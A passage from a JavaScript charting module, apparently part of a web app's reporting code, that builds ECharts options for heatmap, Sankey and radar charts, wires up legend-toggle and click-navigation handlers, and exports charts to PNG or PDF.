            legend: heatmapDualLegend,
            tooltip: {
                position: 'top',
                formatter: function(params) {
                    if (!params.data || params.data.length < 3) return '';
                    const xIdx = params.data[0];
                    const yIdx = params.data[1];
                    const val = params.data[2];
                    const xLabel = categories[xIdx] != null ? categories[xIdx] : xIdx;
                    const yLabel = yNames[yIdx] != null ? yNames[yIdx] : yIdx;
                    let s = xLabel + ' × ' + yLabel + '<br/><strong>' + val + '</strong>';
                    if (urls && urls[xIdx] && urls[xIdx] !== '#') {
                        s += '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>';
                    }
                    return s;
                }
            },
            grid: [
                phantom.grid,
                { left: '8%', right: '6%', top: '12%', bottom: '28%', containLabel: false }
            ],
            xAxis: [
                phantom.xAxis[0],
                {
                gridIndex: 1,
                type: 'category',
                data: categories,
                splitArea: { show: false },
                axisLabel: {
                    ...this.getAxisLabelStyle(),
                    rotate: categories.some(function(c) { return String(c).length > 10; }) ? 45 : 0,
                    interval: 0,
                    margin: 10
                },
                axisLine: this.getAxisLineStyle()
            }
            ],
            yAxis: [
                phantom.yAxis[0],
                {
                gridIndex: 1,
                type: 'category',
                data: yNames,
                splitArea: { show: false },
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle()
            }
            ],
            visualMap: {
                show: true,
                type: 'continuous',
                min: 0,
                max: Math.max(maxVal, 1),
                dimension: 2,
                calculable: true,
                orient: 'horizontal',
                left: 'center',
                bottom: '9%',
                padding: [4, 0, 4, 0],
                textStyle: { color: textColor },
                inRange: {
                    color: heatmapColors
                },
                outOfRange: {
                    color: [heatmapColors[0]]
                },
                seriesIndex: [catIds.length + serIds.length]
            },
            series: phantomCats.concat(phantomSeries).concat([{
                name: labelField || 'Heatmap',
                type: 'heatmap',
                gridIndex: 1,
                xAxisIndex: 1,
                yAxisIndex: 1,
                data: heatData,
                itemStyle: {
                    borderColor: isDark ? '#1f2937' : '#e2e8f0',
                    borderWidth: 1
                },
                label: {
                    show: true,
                    color: isDark ? '#f9fafb' : '#1e293b',
                    textBorderColor: isDark ? '#0c0a09' : '#ffffff',
                    textBorderWidth: 1,
                    fontWeight: 600,
                    formatter: function(p) {
                        return p.data[2] > 0 ? p.data[2] : '';
                    }
                },
                emphasis: {
                    itemStyle: {
                        shadowBlur: 10,
                        shadowColor: 'rgba(0,0,0,0.3)'
                    }
                },
                progressive: 0,
                animation: true
            }])
        };
    },


    buildSankeyNodesLinks: function(stackedData, colors, selected) {
        const palette = this.defaultColors;
        const categories = stackedData.categories;
        const seriesList = stackedData.series;
        const leftSet = new Set(categories.map(function(c) { return String(c); }));
        const seenRight = new Set(leftSet);
        const rightTargets = seriesList.map(function(s, j) {
            const label = String(s.name);
            let id = label;
            if (seenRight.has(id)) {
                id = '__sk_t_' + j;
            }
            if (seenRight.has(id)) {
                id = id + '_' + j;
            }
            seenRight.add(id);
            return { id: id, label: label };
        });

        const links = [];
        for (let j = 0; j < seriesList.length; j++) {
            const row = seriesList[j].data || [];
            const targetId = rightTargets[j].id;
            if (selected && selected[targetId] === false) continue;
            for (let i = 0; i < categories.length; i++) {
                const sourceName = String(categories[i]);
                if (selected && selected[sourceName] === false) continue;
                const raw = row[i];
                const v = typeof raw === 'object' && raw !== null && raw.value !== undefined
                    ? Number(raw.value) || 0
                    : Number(raw) || 0;
                const url = typeof raw === 'object' && raw !== null && raw.url ? raw.url : null;
                if (v > 0) {
                    links.push({
                        source: sourceName,
                        target: targetId,
                        value: v,
                        url: url
                    });
                }
            }
        }

        const leftUsed = new Set();
        const rightUsed = new Set();
        links.forEach(function(l) {
            leftUsed.add(l.source);
            rightUsed.add(l.target);
        });

        const nodes = [];
        categories.forEach(function(c, idx) {
            const name = String(c);
            if (!leftUsed.has(name)) return;
            nodes.push({
                name: name,
                depth: 0,
                itemStyle: {
                    color: palette[idx % palette.length],
                    borderColor: this.getChartBorderColor()
                }
            });
        }.bind(this));
        rightTargets.forEach(function(t, idx) {
            if (!rightUsed.has(t.id)) return;
            nodes.push({
                name: t.id,
                depth: 1,
                itemStyle: {
                    color: palette[idx % palette.length],
                    borderColor: this.getChartBorderColor()
                }
            });
        }.bind(this));

        return {
            nodes: nodes,
            links: links,
            categoryNames: categories.map(function(c) { return String(c); }),
            rightTargets: rightTargets
        };
    },

    getSankeyChartOption: function(stackedData, colors, labelField, urls) {
        if (!stackedData || !stackedData.categories || !stackedData.series || stackedData.series.length === 0) {
            return this.getColumnChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        const palette = this.defaultColors;
        const built = this.buildSankeyNodesLinks(stackedData, palette, null);
        const nodes = built.nodes;
        const links = built.links;
        const categoryNames = built.categoryNames;
        const rightTargets = built.rightTargets || [];

        if (links.length === 0) {
            return this.getColumnChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        const textColor = this.getTextColor();
        const isDark = this.isDarkMode();
        const self = this;

        const legendSeriesLeft = categoryNames.map(function(name, index) {
            return {
                name: name,
                type: 'bar',
                xAxisIndex: 0,
                yAxisIndex: 0,
                data: [0],
                barWidth: 0,
                barGap: '-100%',
                tooltip: { show: false },
                itemStyle: {
                    color: palette[index % palette.length]
                },
                emphasis: { disabled: true }
            };
        });
        const rightIdToLabel = {};
        rightTargets.forEach(function(t) { rightIdToLabel[t.id] = t.label; });

        const legendSeriesRight = rightTargets.map(function(t, index) {
            return {
                name: t.id,
                type: 'bar',
                xAxisIndex: 0,
                yAxisIndex: 0,
                data: [0],
                barWidth: 0,
                barGap: '-100%',
                tooltip: { show: false },
                itemStyle: {
                    color: palette[index % palette.length]
                },
                emphasis: { disabled: true }
            };
        });
        const legendSeries = legendSeriesLeft.concat(legendSeriesRight);

        const legendBase = this.getLegendConfig();
        const dualLegend = [];
        if (categoryNames.length > 0) {
            dualLegend.push({
                ...legendBase,
                show: true,
                type: 'scroll',
                data: categoryNames,
                selectedMode: true,
                top: '0%',
                bottom: undefined,
                left: 'center'
            });
        }
        if (rightTargets.length > 0) {
            dualLegend.push({
                ...legendBase,
                show: true,
                type: 'scroll',
                data: rightTargets.map(function(t) { return t.id; }),
                formatter: function(name) { return rightIdToLabel[name] != null ? rightIdToLabel[name] : name; },
                selectedMode: true,
                bottom: '0%',
                top: undefined,
                left: 'center'
            });
        }

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                triggerOn: 'mousemove',
                formatter: function(params) {
                    if (params.seriesType === 'bar') return '';
                    if (params.dataType === 'edge') {
                        var tgt = params.data.target;
                        if (rightIdToLabel[tgt] != null) tgt = rightIdToLabel[tgt];
                        return params.data.source + ' → ' + tgt + '<br/><strong>' + params.data.value + '</strong>';
                    }
                    if (params.dataType === 'node') {
                        if (rightIdToLabel[params.name] != null) return rightIdToLabel[params.name];
                        return params.name;
                    }
                    return '';
                }
            },
            legend: dualLegend.length > 1 ? dualLegend : (dualLegend.length === 1 ? dualLegend[0] : { show: false }),
            color: palette,
            grid: {
                left: -1000,
                top: -1000,
                width: 1,
                height: 1,
                show: false
            },
            xAxis: [{
                type: 'category',
                data: [''],
                show: false
            }],
            yAxis: [{
                type: 'value',
                show: false,
                max: 1
            }],
            series: legendSeries.concat([{
                id: 'sankey-main',
                name: labelField || 'Sankey',
                type: 'sankey',
                top: dualLegend.length > 1 ? '10%' : '2%',
                bottom: dualLegend.length > 1 ? '14%' : undefined,
                emphasis: { focus: 'adjacency' },
                layoutIterations: 32,
                data: nodes,
                links: links,
                lineStyle: {
                    color: 'gradient',
                    curveness: 0.5,
                    opacity: isDark ? 0.35 : 0.45
                },
                label: {
                    color: textColor,
                    fontFamily: self.commonStyles.fontFamily,
                    fontSize: 11,
                    formatter: function(p) {
                        var n = p.name != null ? p.name : (p.data && p.data.name);
                        if (n && rightIdToLabel[n] != null) return rightIdToLabel[n];
                        return n || '';
                    }
                },
                itemStyle: {
                    borderWidth: 0
                },
                levels: [
                    { depth: 0, itemStyle: { borderColor: self.getChartBorderColor() } },
                    { depth: 1, itemStyle: { borderColor: self.getChartBorderColor() } }
                ],
                nodeWidth: 12,
                nodeGap: 8
            }])
        };
    },

    // Radar chart — single dimension: one polygon over labels as axes
    getRadarChartOption: function(labels, data, colors, labelField, urls) {
        if (!labels || labels.length === 0) {
            return this.getPieChartOption(['No Data'], [0], colors, labelField, urls);
        }

        function toNum(v) {
            if (typeof v === 'object' && v !== null && v.value !== undefined) {
                return Math.max(0, Number(v.value) || 0);
            }
            return Math.max(0, Number(v) || 0);
        }

        const values = labels.map(function(_, i) { return toNum(data[i]); });
        const globalMax = Math.max.apply(null, values.concat([1]));
        const axisMax = Math.ceil(globalMax * 1.15) || 1;

        const indicator = labels.map(function(name) {
            return { name: String(name), max: axisMax };
        });

        const textColor = this.getTextColor();
        const radarLine = this.getAxisLineColor();

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    if (!params.data || !params.data.value || !indicator.length) {
                        return params.name || params.seriesName || '';
                    }
                    var seriesName = params.data.name || params.seriesName || (labelField || 'Radar');
                    var vals = params.data.value;
                    var lines = ['<strong>' + seriesName + '</strong>'];
                    for (var i = 0; i < vals.length && i < indicator.length; i++) {
                        lines.push(indicator[i].name + ': <strong>' + vals[i] + '</strong>');
                    }
                    return lines.join('<br/>');
                }
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            radar: {
                indicator: indicator,
                shape: 'polygon',
                splitNumber: 4,
                axisName: {
                    color: textColor,
                    fontSize: 11,
                    fontFamily: this.commonStyles.fontFamily
                },
                splitLine: { lineStyle: { color: this.getSplitLineColor() } },
                splitArea: { show: true, areaStyle: { color: [this.isDarkMode() ? 'rgba(55,65,81,0.15)' : 'rgba(0,0,0,0.02)'] } },
                axisLine: { lineStyle: { color: radarLine } }
            },
            series: [{
                name: labelField || 'Radar',
                type: 'radar',
                symbol: 'circle',
                symbolSize: 6,
                lineStyle: { width: 2, color: this.defaultColors[0] },
                itemStyle: { color: this.defaultColors[0] },
                areaStyle: { opacity: 0.2 },
                data: [{
                    value: values,
                    name: labelField || 'Value'
                }]
            }]
        };
    },

    /**
     * Build radar indicator + radarData from stackedData; selected __g_i__ / __s_j__ false excludes axis or polygon.
     */
    buildRadarFromStacked: function(stackedData, colors, selected) {
        const categories = stackedData.categories;
        const seriesList = stackedData.series;
        const palette = this.defaultColors;

        function toNum(v) {
            if (typeof v === 'object' && v !== null && v.value !== undefined) {
                return Math.max(0, Number(v.value) || 0);
            }
            return Math.max(0, Number(v) || 0);
        }

        const keepI = [];
        for (let i = 0; i < categories.length; i++) {
            if (selected && selected['__g_' + i + '__'] === false) continue;
            keepI.push(i);
        }
        const keepJ = [];
        for (let j = 0; j < seriesList.length; j++) {
            if (selected && selected['__s_' + j + '__'] === false) continue;
            keepJ.push(j);
        }
        if (keepI.length === 0 || keepJ.length === 0) {
            return { indicator: [], radarData: [], axisMax: 1 };
        }

        let globalMax = 1;
        for (let jj = 0; jj < keepJ.length; jj++) {
            const j = keepJ[jj];
            const row = seriesList[j].data || [];
            for (let ii = 0; ii < keepI.length; ii++) {
                const i = keepI[ii];
                const v = toNum(row[i]);
                if (v > globalMax) globalMax = v;
            }
        }
        const axisMax = Math.ceil(globalMax * 1.15) || 1;

        const indicator = keepI.map(function(i) {
            return { name: String(categories[i]), max: axisMax };
        });

        const radarData = keepJ.map(function(j, idx) {
            const s = seriesList[j];
            const row = s.data || [];
            const vals = keepI.map(function(i) { return toNum(row[i]); });
            return {
                value: vals,
                name: '__s_' + j + '__',
                itemStyle: { color: palette[j % palette.length] },
                lineStyle: { color: palette[j % palette.length] },
                areaStyle: { opacity: 0.12 }
            };
        });

        return { indicator: indicator, radarData: radarData, axisMax: axisMax, keepI: keepI, keepJ: keepJ };
    },

    // Radar chart — stacked payload: dual legends like Sankey (axes + series), clickable
    getRadarChartOptionFromStacked: function(stackedData, colors, labelField, urls, opts) {
        const categories = stackedData.categories;
        const seriesList = stackedData.series;
        if (!categories || categories.length === 0 || !seriesList || seriesList.length === 0) {
            return this.getRadarChartOption(['No Data'], [0], this.defaultColors, labelField, urls);
        }

        opts = opts || {};
        const originalStacked = opts.originalStackedData || stackedData;
        const originalCats = originalStacked.categories;
        const originalSeries = originalStacked.series;
        const palette = this.defaultColors;

        const catIds = originalCats.map(function(_, i) { return '__g_' + i + '__'; });
        const serIds = originalSeries.map(function(_, j) { return '__s_' + j + '__'; });
        const catLabelById = {};
        originalCats.forEach(function(c, i) { catLabelById[catIds[i]] = String(c); });
        const serLabelById = {};
        originalSeries.forEach(function(s, j) { serLabelById[serIds[j]] = String(s.name); });

        const legendSelectedFull = this._mergeDualLegendSelected(catIds, serIds, opts.legendSelected);

        const built = this.buildRadarFromStacked(originalStacked, palette, opts.legendSelected || null);
        if (!built.indicator.length || !built.radarData.length) {
            return this.getRadarChartOption(['No Data'], [0], this.defaultColors, labelField, urls);
        }

        const textColor = this.getTextColor();
        const phantom = this._phantomLegendGrid();
        const phantomCats = catIds.map(function(id, index) {
            return {
                name: id, type: 'bar', gridIndex: 0, xAxisIndex: 0, yAxisIndex: 0,
                data: [0], barWidth: 0, barGap: '-100%', tooltip: { show: false },
                itemStyle: { color: palette[index % palette.length] }, emphasis: { disabled: true }
            };
        });
        const phantomSeries = serIds.map(function(id, index) {
            return {
                name: id, type: 'bar', gridIndex: 0, xAxisIndex: 0, yAxisIndex: 0,
                data: [0], barWidth: 0, barGap: '-100%', tooltip: { show: false },
                itemStyle: { color: palette[(index + catIds.length) % palette.length] }, emphasis: { disabled: true }
            };
        });

        const legendBase = this.getLegendConfig();
        const dualLegend = [
            {
                ...legendBase,
                show: catIds.length > 0,
                type: 'scroll',
                data: catIds,
                selectedMode: true,
                top: '0%',
                bottom: undefined,
                left: 'center',
                formatter: function(name) { return catLabelById[name] != null ? catLabelById[name] : name; },
                selected: legendSelectedFull
            },
            {
                ...legendBase,
                show: serIds.length > 0,
                type: 'scroll',
                data: serIds,
                selectedMode: true,
                bottom: '0%',
                top: undefined,
                left: 'center',
                formatter: function(name) { return serLabelById[name] != null ? serLabelById[name] : name; },
                selected: legendSelectedFull
            }
        ];

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    if (params.seriesType === 'bar') return '';
                    var n = params.name;
                    if (serLabelById[n] != null) n = serLabelById[n];
                    if (params.data && params.data.value && built.indicator && built.indicator.length) {
                        var vals = params.data.value;
                        var lines = ['<strong>' + n + '</strong>'];
                        for (var i = 0; i < vals.length && i < built.indicator.length; i++) {
                            lines.push(built.indicator[i].name + ': <strong>' + vals[i] + '</strong>');
                        }
                        return lines.join('<br/>');
                    }
                    return n || '';
                }
            },
            legend: dualLegend,
            grid: [phantom.grid],
            xAxis: phantom.xAxis,
            yAxis: phantom.yAxis,
            radar: {
                indicator: built.indicator,
                shape: 'polygon',
                splitNumber: 4,
                center: ['50%', '52%'],
                radius: '58%',
                axisName: {
                    color: textColor,
                    fontSize: 11,
                    fontFamily: this.commonStyles.fontFamily
                },
                splitLine: { lineStyle: { color: this.getSplitLineColor() } },
                splitArea: { show: true, areaStyle: { color: [this.isDarkMode() ? 'rgba(55,65,81,0.15)' : 'rgba(0,0,0,0.02)'] } },
                axisLine: { lineStyle: { color: this.getAxisLineColor() } }
            },
            color: palette,
            series: phantomCats.concat(phantomSeries).concat([{
                id: 'radar-main',
                name: labelField || 'Radar',
                type: 'radar',
                symbol: 'circle',
                symbolSize: 5,
                data: built.radarData
            }])
        };
    },

    // Animation configurations (delay fns reused to avoid per-chart allocations)
    _animationDelayByIndex: function(idx) { return idx * 10; },
    getAnimationConfig: function() {
        return {
            animation: true,
            animationThreshold: 2000,
            animationDuration: 1000,
            animationEasing: 'cubicOut',
            animationDelay: this._animationDelayByIndex,
            animationDurationUpdate: 300,
            animationEasingUpdate: 'cubicOut',
            animationDelayUpdate: this._animationDelayByIndex
        };
    },

    /**
     * Treemap uses phantom bar series so the legend shows; when legend is clicked,
     * sync treemap data so tiles show/hide to match selection.
     */
    attachTreemapLegendHandler: function(chartInstance, config) {
        if (!chartInstance || !config || config.type !== 'treemap' || !config.labels || !config.labels.length) return;
        var self = this;
        var labels = config.labels;
        var data = config.data || [];
        var urls = config.urls || [];
        var palette = this.defaultColors;
        var labelField = config.labelField || 'Treemap';

        function buildTreemapData(selected) {
            var nodes = [];
            for (var i = 0; i < labels.length; i++) {
                var label = labels[i];
                var key = String(label);
                if (selected && selected[key] === false) continue;
                var index = i;
                nodes.push({
                    name: label,
                    value: Math.max(0, Number(data[index]) || 0),
                    url: urls[index] || null,
                    itemStyle: {
                        color: palette[index % palette.length],
                        borderColor: self.getChartBorderColor(),
                        borderWidth: 1
                    }
                });
            }
            if (nodes.length === 0) {
                nodes.push({
                    name: '(none)',
                    value: 1,
                    itemStyle: {
                        color: self.isDarkMode() ? '#374151' : '#e5e7eb',
                        borderColor: self.getChartBorderColor(),
                        borderWidth: 1
                    }
                });
            }
            return nodes;
        }

        chartInstance.on('legendselectchanged', function(evt) {
            if (!evt || !evt.selected) return;
            var treemapData = buildTreemapData(evt.selected);
            // Merge by series id so phantom bar series stay intact
            chartInstance.setOption({
                series: [{ id: 'treemap-main', data: treemapData }]
            });
        });
    },

    /**
     * Sankey legend = left column categories; clicking filters links from that source.
     */
    attachSankeyLegendHandler: function(chartInstance, config) {
        if (!chartInstance || !config || config.type !== 'sankey' || !config.stackedData ||
            !config.stackedData.categories || !config.stackedData.series || config.stackedData.series.length === 0) {
            return;
        }
        var self = this;
        var stackedData = config.stackedData;
        var palette = this.defaultColors;

        chartInstance.on('legendselectchanged', function(evt) {
            if (!evt || !evt.selected) return;
            var built = self.buildSankeyNodesLinks(stackedData, palette, evt.selected);
            if (built.links.length === 0) {
                // All categories hidden — show empty sankey placeholder to avoid ECharts errors
                chartInstance.setOption({
                    series: [{
                        id: 'sankey-main',
                        data: [{ name: '(none)', depth: 0 }],
                        links: []
                    }]
                });
                return;
            }
            chartInstance.setOption({
                series: [{
                    id: 'sankey-main',
                    data: built.nodes,
                    links: built.links
                }]
            });
        });
    },

    attachHeatmapLegendHandler: function(chartInstance, config) {
        if (!chartInstance || !config || config.type !== 'heatmap' || !config.stackedData ||
            !config.stackedData.categories || !config.stackedData.series || config.stackedData.series.length === 0) {
            return;
        }
        var self = this;
        var originalStacked = config.stackedData;
        var palette = this.defaultColors;
        var labelField = config.labelField || '';
        var urls = config.urls;

        if (!config._heatmapLegendSelected) config._heatmapLegendSelected = {};

        function handler(evt) {
            if (!evt || !evt.selected) return;
            var isG = evt.name && evt.name.indexOf('__g_') === 0;
            var isS = evt.name && evt.name.indexOf('__s_') === 0;
            if (!isG && !isS) return;
            // Merge into persistent map so click-to-show again works (evt.selected can be partial after rebuild)
            for (var k in evt.selected) {
                if (k.indexOf('__g_') === 0 || k.indexOf('__s_') === 0) {
                    config._heatmapLegendSelected[k] = evt.selected[k];
                }
            }
            var built = self.buildHeatmapData(originalStacked, config._heatmapLegendSelected);
            if (!built.categories.length || !built.yNames.length) {
                // All hidden on one axis — restore last toggle so user can recover
                if (evt.name) config._heatmapLegendSelected[evt.name] = true;
                built = self.buildHeatmapData(originalStacked, config._heatmapLegendSelected);
                if (!built.categories.length || !built.yNames.length) return;
            }
            var opt = self.getHeatmapChartOption(originalStacked, palette, labelField, urls, {
                originalStackedData: originalStacked,
                legendSelected: config._heatmapLegendSelected
            });
            chartInstance.setOption(opt, {
                notMerge: true,
                replaceMerge: ['series', 'xAxis', 'yAxis', 'grid', 'legend', 'visualMap']
            });
        }

        chartInstance.off('legendselectchanged');
        chartInstance.on('legendselectchanged', handler);
    },

    attachRadarLegendHandler: function(chartInstance, config) {
        if (!chartInstance || !config || config.type !== 'radar' || !config.stackedData ||
            !config.stackedData.categories || !config.stackedData.series || config.stackedData.series.length === 0) {
            return;
        }
        var self = this;
        var originalStacked = config.stackedData;
        var palette = this.defaultColors;
        var labelField = config.labelField || '';

        if (!config._radarLegendSelected) config._radarLegendSelected = {};

        function handler(evt) {
            if (!evt || !evt.selected) return;
            var isG = evt.name && evt.name.indexOf('__g_') === 0;
            var isS = evt.name && evt.name.indexOf('__s_') === 0;
            if (!isG && !isS) return;
            for (var k in evt.selected) {
                if (k.indexOf('__g_') === 0 || k.indexOf('__s_') === 0) {
                    config._radarLegendSelected[k] = evt.selected[k];
                }
            }
            var built = self.buildRadarFromStacked(originalStacked, palette, config._radarLegendSelected);
            if (!built.indicator.length || !built.radarData.length) {
                if (evt.name) config._radarLegendSelected[evt.name] = true;
                built = self.buildRadarFromStacked(originalStacked, palette, config._radarLegendSelected);
                if (!built.indicator.length || !built.radarData.length) return;
            }
            var opt = self.getRadarChartOptionFromStacked(originalStacked, palette, labelField, config.urls, {
                originalStackedData: originalStacked,
                legendSelected: config._radarLegendSelected
            });
            chartInstance.setOption(opt, {
                notMerge: true,
                replaceMerge: ['series', 'radar', 'legend', 'grid', 'xAxis', 'yAxis']
            });
        }

        chartInstance.off('legendselectchanged');
        chartInstance.on('legendselectchanged', handler);
    },

    attachStackedDualLegendHandler: function(chartInstance, config) {
        if (!chartInstance || !config || !config.stackedData ||
            !config.stackedData.categories || !config.stackedData.series || config.stackedData.series.length === 0) {
            return;
        }
        var type = (config.type || '').toLowerCase();
        if (type !== 'stacked_vertical' && type !== 'stacked_horizontal') return;
        var self = this;
        var originalStacked = config.stackedData;
        var palette = this.defaultColors;
        var labelField = config.labelField || '';

        function handler(evt) {
            if (!evt || !evt.selected) return;
            var toggledCategory = evt.name && evt.name.indexOf('__g_') === 0;
            if (!toggledCategory) return;
            var filtered = self.filterStackedDataByCategories(originalStacked, evt.selected);
            if (!filtered.categories || filtered.categories.length === 0) return;
            var opts = { originalStackedData: originalStacked, legendSelected: evt.selected };
            var opt = type === 'stacked_horizontal'
                ? self.getStackedHorizontalChartOption(filtered, palette, labelField, config.urls, opts)
                : self.getStackedVerticalChartOption(filtered, palette, labelField, config.urls, opts);
            chartInstance.setOption(opt, {
                notMerge: true,
                replaceMerge: ['series', 'xAxis', 'yAxis', 'grid', 'legend']
            });
        }

        chartInstance.off('legendselectchanged');
        chartInstance.on('legendselectchanged', handler);
    },

    attachClickHandler: function(chartInstance, urls, config) {
        if (config && config.type === 'treemap') {
            this.attachTreemapLegendHandler(chartInstance, config);
        }
        if (config && config.type === 'sankey') {
            this.attachSankeyLegendHandler(chartInstance, config);
        }
        if (config && (config.type === 'stacked_vertical' || config.type === 'stacked_horizontal')) {
            this.attachStackedDualLegendHandler(chartInstance, config);
        }
        if (config && config.type === 'heatmap') {
            this.attachHeatmapLegendHandler(chartInstance, config);
        }
        if (config && config.type === 'radar' && config.stackedData &&
            config.stackedData.categories && config.stackedData.series && config.stackedData.series.length > 0) {
            this.attachRadarLegendHandler(chartInstance, config);
        }
        if (!urls || urls.length === 0) return;

        chartInstance.on('click', function(params) {
            let targetUrl = null;

            // Sankey: prefer edge-level URL (two-dimensional filter)
            if (config && config.type === 'sankey' && params.seriesType === 'sankey') {
                if (params.dataType === 'edge' && params.data && params.data.url && params.data.url !== '#') {
                    targetUrl = params.data.url;
                } else if (params.dataType === 'node' && params.name && config.stackedData && Array.isArray(config.stackedData.categories)) {
                    // Left-side node click falls back to primary-dimension URL
                    const idx = config.stackedData.categories.indexOf(params.name);
                    if (idx >= 0 && idx < urls.length && urls[idx] && urls[idx] !== '#') {
                        targetUrl = urls[idx];
                    }
                }
            } else if (params.seriesType === 'heatmap' && Array.isArray(params.data) && params.data.length >= 1) {
                if (params.data.length >= 4 && params.data[3] && params.data[3] !== '#') {
                    targetUrl = params.data[3];
                } else if (params.data[0] != null && urls[params.data[0]] && urls[params.data[0]] !== '#') {
                    targetUrl = urls[params.data[0]];
                }
            } else if (params.data && params.data.url) {
                targetUrl = params.data.url;
            }
            else if (params.seriesIndex !== undefined && params.seriesIndex < urls.length) {
                targetUrl = urls[params.seriesIndex];
            }
            else if (params.dataIndex !== undefined && params.dataIndex < urls.length) {
                targetUrl = urls[params.dataIndex];
            }

            if (targetUrl && targetUrl !== '#') {
                if (typeof htmx !== 'undefined') {
                    const tempLink = document.createElement('a');
                    tempLink.href = targetUrl;
                    tempLink.setAttribute('hx-get', targetUrl);
                    tempLink.setAttribute('hx-target', '#mainContent');
                    tempLink.setAttribute('hx-swap', 'outerHTML');
                    tempLink.setAttribute('hx-push-url', 'true');
                    tempLink.setAttribute('hx-select', '#mainContent');
                    tempLink.setAttribute('hx-select-oob', '#sideMenuContainer');

                    htmx.process(tempLink);
                    tempLink.click();
                } else {
                    window.location.href = targetUrl;
                }
            }
        });

        chartInstance.on('mouseover', function(params) {
            let hasUrl = false;

            if (params.seriesType === 'heatmap' && Array.isArray(params.data) && urls && urls.length > 0) {
                if (params.data[0] != null && params.data[0] < urls.length && urls[params.data[0]] && urls[params.data[0]] !== '#') {
                    hasUrl = true;
                }
            } else if (params.data && params.data.url && params.data.url !== '#') {
                hasUrl = true;
            } else if (urls && (params.dataIndex < urls.length || params.seriesIndex < urls.length)) {
                hasUrl = true;
            }

            if (hasUrl) {
                chartInstance.getDom().style.cursor = 'pointer';
            }
        });

        chartInstance.on('mouseout', function() {
            chartInstance.getDom().style.cursor = 'default';
        });
    },

    refreshChartTheme: function(chartInstance, config) {
        if (!chartInstance) return;
        try {
            const dom = chartInstance.getDom && chartInstance.getDom();
            if (dom && !document.body.contains(dom)) return; // Chart no longer in DOM (e.g. navigated away)
        } catch (e) { return; }

        const option = this.getChartOption(config);

        chartInstance.setOption(option, {
            notMerge: true,
            replaceMerge: ['series', 'xAxis', 'yAxis'],
            lazyUpdate: false
        });
    },

    formatNumber: function(num, decimals = 0) {
        if (num === null || num === undefined) return '0';
        const factor = Math.pow(10, decimals);
        const formatted = Math.round(num * factor) / factor;
        return formatted.toLocaleString();
    },

    getDynamicColors: function(dataLength) {
        const colors = [...this.defaultColors];
        while (colors.length < dataLength) {
            const hue = (colors.length * 137.5) % 360;
            colors.push(`hsl(${hue}, 70%, 60%)`);
        }
        return colors.slice(0, dataLength);
    },

    exportChart: function(chartInstance, filename = 'chart', format = 'png') {
        if (!chartInstance) return;

        const url = chartInstance.getDataURL({
            pixelRatio: 2,
            backgroundColor: '#fff',
            excludeComponents: ['toolbox']
        });

        const link = document.createElement('a');
        link.download = `${filename}.${format}`;
        link.href = url;
        link.click();
    },


    getChartInstanceByDomId: function(chartDomId) {
        if (!chartDomId) return null;
        var dom = document.getElementById(chartDomId);
        if (dom && typeof echarts !== 'undefined' && echarts.getInstanceByDom) {
            var inst = echarts.getInstanceByDom(dom);
            if (inst && !inst.isDisposed()) return inst;
        }
        if (window.chartInstances) {
            var key = 'horilla-chart-view-' + chartDomId;
            if (window.chartInstances[key] && window.chartInstances[key].instance) {
                var i = window.chartInstances[key].instance;
                if (i && !i.isDisposed()) return i;
            }
        }
        if (chartDomId.indexOf('chart-') === 0) {
            var pk = chartDomId.split('-')[1];
            if (pk && window['reportChartInstance_' + pk]) {
                var r = window['reportChartInstance_' + pk];
                if (r && !r.isDisposed()) return r;
            }
        }
        return null;
    },


    exportChartAsPDF: function(chartDomId, filename) {
        try {
            if (!window.jspdf || !window.jspdf.jsPDF) {
                console.error('jsPDF library is not loaded.');
                if (typeof alert !== 'undefined') {
                    alert('Failed to export PDF: jsPDF library is not loaded.');
                }
                return;
            }
            var chartInstance = this.getChartInstanceByDomId(chartDomId);
            if (!chartInstance) {
                console.error('Chart instance not found for id:', chartDomId);
                if (typeof alert !== 'undefined') {
                    alert('Failed to export PDF: Chart instance not available.');
                }
                return;
            }
            chartInstance.resize();
            var imgData = chartInstance.getDataURL({
                pixelRatio: 2,
                backgroundColor: '#fff',
                excludeComponents: ['toolbox']
            });
            if (!imgData) {
                console.error('Failed to generate chart image data.');
                if (typeof alert !== 'undefined') {
                    alert('Failed to export PDF: Could not generate chart image.');
                }
                return;
            }
            var jsPDF = window.jspdf.jsPDF;
            var pdf = new jsPDF({
                orientation: 'landscape',
                unit: 'px',
                format: [800, 400]
            });
            var imgProps = pdf.getImageProperties(imgData);
            var pdfWidth = pdf.internal.pageSize.getWidth();
            var pdfHeight = pdf.internal.pageSize.getHeight();
            var imgWidth = 700;
            var imgHeight = (imgProps.height * imgWidth) / imgProps.width;
            var x = (pdfWidth - imgWidth) / 2;
            var y = (pdfHeight - imgHeight) / 2;
            pdf.addImage(imgData, 'PNG', x, y, imgWidth, imgHeight);
            pdf.save((filename || 'chart') + '.pdf');
        } catch (error) {
            console.error('Error exporting chart as PDF:', error);
            if (typeof alert !== 'undefined') {
                alert('Failed to export PDF: An error occurred.');
            }
        }
    }
};


if (typeof window !== 'undefined') {
    window.exportChartAsPDF = function(chartDomId, filename) {
        if (EChartsConfig && typeof EChartsConfig.exportChartAsPDF === 'function') {
            return EChartsConfig.exportChartAsPDF(chartDomId, filename);
        }
    };
}

if (typeof module !== 'undefined' && module.exports) {
